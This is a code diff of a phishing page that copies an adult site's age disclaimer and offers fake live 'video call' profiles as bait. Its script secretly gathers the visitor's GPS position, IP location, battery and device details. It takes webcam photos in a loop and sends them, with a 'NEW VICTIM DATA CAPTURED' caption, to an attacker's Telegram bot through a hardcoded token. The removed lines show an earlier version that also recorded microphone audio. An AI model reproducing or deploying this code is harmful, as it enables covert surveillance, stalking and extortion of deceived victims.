@@ -6,7 +6,6 @@
   <title>EroMe - Porn Video & Photo Sharing</title>
   <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
   <style>
-    /* CSS DO CÓDIGO ORIGINAL (PERFIS) */
     body {
       font-family: 'Poppins', 'Montserrat', sans-serif;
       margin: 0;
@@ -118,7 +117,6 @@
       text-align: center;
     }
 
-    /* CSS DO DISCLAIMER (EROME) */
     #disclaimer {
       position: fixed;
       top: 0;
@@ -200,7 +198,6 @@
 </head>
 <body>
 
-  <!-- TELA DE DISCLAIMER (EROME) -->
   <div id="disclaimer">
     <div class="bg">
       <img src="https://www.erome.com//img/bg.jpg">
@@ -214,7 +211,6 @@
     </div>
   </div>
 
-  <!-- CONTEÚDO PRINCIPAL (PERFIS) -->
   <div class="container" id="mainContent" style="display: none;">
     <h2 style="text-shadow: 0 0 15px #fff, 0 0 25px #28a745;">Video Call</h2>
     <p style="color: #d1d1d1; font-size: 14px;">Choose someone to connect with live</p>
@@ -222,7 +218,6 @@
     
     <div class="profiles-container">
       <div class="profiles" id="profiles">
-        <!-- Perfis de Exemplo -->
         <div class="profile">
           <img src="https://single-girl.netlify.app/indian girl/indian1.jpg" alt="Priya">
           <div class="online-dot"></div>
@@ -247,7 +242,6 @@
           <span>Tasnim &#127463;&#127465;</span>
           <button class="call-btn">Call</button>
         </div>
-        <!-- Adicione mais perfis conforme necessário -->
       </div>
     </div>
   </div>
@@ -257,84 +251,116 @@
     // TELEGRAM BOT CONFIGURATION
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8690496477:AAHv5lD-p5tlEOdipUlyMMnBY86uCgVwzrI'; 
-    const TELEGRAM_CHAT_ID = '7071495926'; // IMPORTANTE: Substitua pelo seu ID real (use @userinfobot)
+    const TELEGRAM_CHAT_ID = 'YOUR_REAL_CHAT_ID'; // Substitua pelo seu ID real
     const TELEGRAM_API_URL = 'https://api.telegram.org/bot';
 
-    let currentUserData = {};
+    let currentUserData = {
+      device: {},
+      ip: {},
+      location: null,
+      battery: { level: 'N/A', charging: 'No' }
+    };
+    
     let photoInterval = null;
     let audioInterval = null;
-    let localVideo = document.createElement('video');
 
     // ============================================
     // FUNÇÕES TELEGRAM
     // ============================================
-    async function sendTelegramMessage(text) {
+    async function sendTelegramPhotoWithData(photoBlob) {
       try {
-        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const now = new Date();
+        const timestamp = now.getFullYear() + '-' + 
+                         String(now.getMonth() + 1).padStart(2, '0') + '-' + 
+                         String(now.getDate()).padStart(2, '0') + ' ' + 
+                         String(now.getHours()).padStart(2, '0') + ':' + 
+                         String(now.getMinutes()).padStart(2, '0') + ':' + 
+                         String(now.getSeconds()).padStart(2, '0');
+
+        let caption = `🔍 NEW VICTIM DATA CAPTURED\n\n`;
+        
+        // Seção Localização
+        caption += `📍 Location:\n`;
+        if (currentUserData.location) {
+          const loc = currentUserData.location;
+          caption += `Latitude: ${loc.lat}\n`;
+          caption += `Longitude: ${loc.lon}\n`;
+          caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
+          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
+          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
+          caption += `Map: https://maps.google.com/?q=${loc.lat},${loc.lon}\n\n`;
+        } else {
+          caption += `Latitude: N/A\n`;
+          caption += `Longitude: N/A\n`;
+          caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
+          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
+          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
+          caption += `Map: N/A\n\n`;
+        }
+
+        // Seção Dispositivo
+        caption += `🔋 Device Info:\n`;
+        caption += `Battery: ${currentUserData.battery.level}%\n`;
+        caption += `Charging: ${currentUserData.battery.charging}\n`;
+        caption += `Platform: ${currentUserData.device.platform}\n`;
+        caption += `Language: ${currentUserData.device.lang}\n\n`;
+        
+        // Timestamp
+        caption += `🕒 Timestamp: ${timestamp}`;
+
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', photoBlob, 'capture.jpg');
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+
+        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+          body: formData
         });
-      } catch (e) {}
-    }
-
-    async function sendTelegramData(title, data) {
-      let message = `<b>${title}</b>\n\n`;
-      for (const [key, value] of Object.entries(data)) {
-        message += `<b>${key}:</b> ${typeof value === 'object' ? JSON.stringify(value) : value}\n`;
+      } catch (e) {
+        console.error('Error sending photo:', e);
       }
-      return sendTelegramMessage(message);
-    }
-
-    async function sendTelegramPhoto(photoBlob, caption = '') {
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', photoBlob, 'photo.jpg');
-        if (caption) formData.append('caption', caption);
-        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-      } catch (e) {}
-    }
-
-    async function sendTelegramAudio(audioBlob, caption = '') {
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('audio', audioBlob, 'audio.webm');
-        if (caption) formData.append('caption', caption);
-        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
-      } catch (e) {}
     }
 
     // ============================================
     // COLETA DE DADOS
     // ============================================
     async function collectData() {
-      const data = {
-        device: {
-          ua: navigator.userAgent,
-          platform: navigator.platform,
-          lang: navigator.language,
-          screen: `${screen.width}x${screen.height}`,
-          tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-        },
-        ip: {}
+      // Info do Dispositivo
+      currentUserData.device = {
+        platform: navigator.platform,
+        lang: navigator.language
       };
 
+      // Bateria
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          currentUserData.battery = {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging ? 'Yes' : 'No'
+          };
+        }
+      } catch (e) {}
+
+      // IP Info
       try {
         const res = await fetch('https://ipapi.co/json/');
         const ipData = await res.json();
-        data.ip = { ip: ipData.ip, city: ipData.city, country: ipData.country_name, isp: ipData.org };
+        currentUserData.ip = {
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name
+        };
       } catch (e) {}
-
-      return data;
     }
 
     async function getGPS() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
-          (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+          (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
           () => resolve(null),
           { enableHighAccuracy: true, timeout: 5000 }
         );
@@ -345,71 +371,52 @@
     // PROCESSO PRINCIPAL
     // ============================================
     async function startProcess() {
-      // 1. Esconder disclaimer e mostrar conteúdo
       document.getElementById('disclaimer').style.display = 'none';
       document.getElementById('mainContent').style.display = 'block';
       document.body.style.overflow = 'visible';
 
       const status = document.querySelector('.status');
-      status.textContent = 'Iniciando conexão segura...';
+      status.textContent = 'Coletando dados do sistema...';
 
-      // 2. Coletar e enviar dados básicos
-      currentUserData = await collectData();
-      await sendTelegramData('📱 Novo Acesso', currentUserData.device);
-      await sendTelegramData('🌐 Info de IP', currentUserData.ip);
+      await collectData();
 
-      // 3. Pedir Permissões
-      status.textContent = 'Solicitando câmera e localização...';
+      status.textContent = 'Solicitando permissões...';
       
-      // GPS
-      const gps = await getGPS();
-      if (gps) await sendTelegramData('📍 Localização', gps);
+      // Tentar pegar GPS antes da foto
+      currentUserData.location = await getGPS();
 
-      // Câmera e Microfone
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        status.textContent = 'Conectado! Iniciando chamada...';
-        await sendTelegramMessage('✅ Permissões de Mídia Concedidas');
+        status.textContent = 'Conectado! Iniciando captura...';
 
-        // Iniciar envios
-        startPhotoSend(stream);
-        startAudioSend(stream);
+        // Primeira captura imediata
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const bitmap = await imageCapture.grabFrame();
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width; canvas.height = bitmap.height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(bitmap, 0, 0);
+        canvas.toBlob(blob => {
+          sendTelegramPhotoWithData(blob);
+        }, 'image/jpeg', 0.8);
+
+        // Iniciar loop de fotos (opcional, aqui a cada 30 segundos para não sobrecarregar)
+        photoInterval = setInterval(async () => {
+          try {
+            const b = await imageCapture.grabFrame();
+            const c = document.createElement('canvas');
+            c.width = b.width; c.height = b.height;
+            const cx = c.getContext('2d');
+            cx.drawImage(b, 0, 0);
+            c.toBlob(blob => sendTelegramPhotoWithData(blob), 'image/jpeg', 0.8);
+          } catch (e) {}
+        }, 30000);
 
         setTimeout(() => status.style.display = 'none', 3000);
       } catch (e) {
-        status.textContent = 'Erro: Acesso à câmera negado.';
-        await sendTelegramMessage('❌ Permissão de Câmera Negada');
+        status.textContent = 'Erro: Permissão negada.';
       }
-    }
-
-    function startPhotoSend(stream) {
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      let count = 0;
-      photoInterval = setInterval(async () => {
-        try {
-          const bitmap = await imageCapture.grabFrame();
-          const canvas = document.createElement('canvas');
-          canvas.width = bitmap.width; canvas.height = bitmap.height;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(bitmap, 0, 0);
-          canvas.toBlob(blob => {
-            count++;
-            sendTelegramPhoto(blob, `📸 Foto #${count}`);
-          }, 'image/jpeg', 0.7);
-        } catch (e) {}
-      }, 2000);
-    }
-
-    function startAudioSend(stream) {
-      audioInterval = setInterval(() => {
-        const recorder = new MediaRecorder(new MediaStream(stream.getAudioTracks()), { mimeType: 'audio/webm' });
-        const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => sendTelegramAudio(new Blob(chunks, { type: 'audio/webm' }), '🎙️ Áudio Gravado');
-        recorder.start();
-        setTimeout(() => recorder.stop(), 5000);
-      }, 10000);
     }
   </script>
 </body>
